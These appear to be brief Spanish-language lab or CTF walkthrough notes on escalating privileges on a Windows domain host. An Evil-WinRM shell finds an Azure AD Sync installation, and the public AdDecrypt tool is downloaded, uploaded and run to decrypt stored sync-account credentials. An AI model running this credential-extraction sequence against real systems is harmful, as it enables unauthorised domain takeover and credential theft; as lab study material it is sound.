

### IDENTIFICAR GRUPO DE AZURE ADMIN
```shell
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
Global Group memberships     *Azure Admins         *Domain Users
```

### CARPETA DE AZURE
#### LISTAR VIA POTENCIAL PARA ESCALAR PRIVILEGIOS
```shell
*Evil-WinRM* PS C:\Users\mhope\Desktop> cd "C:\Program Files"
*Evil-WinRM* PS C:\Program Files>
*Evil-WinRM* PS C:\Program Files> ls
-----> Microsoft Azure AD Sync [*NOS INTERESA ESTO*]
```



### REPOSITORIO Microsoft Azure AD Sync
```shell
wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
```


### CARPETA SEGURA PARA HACER ESCALADA
```shell
*DIRECTORIO SEGURO PARA ELEVAR PRIVILEGIOS.*

*Evil-WinRM* PS C:\> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> mkdir Privesc
*Evil-WinRM* PS C:\Windows\Temp> cd Privesc
```

# AdDecrypt
```shell
❯ unzip AdDecrypt.zip
```


### SUBIR ARCHIVOS
```shell
#AdDecrypt.exe
upload AdDecrypt.exe

#mcrypt.dll
upload mcrypt.dll
```


### EJECUTAR EL BINARIO
```shell
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"

C:\Windows\Temp\Privesc\AdDecrypt.exe -FullSQL
```

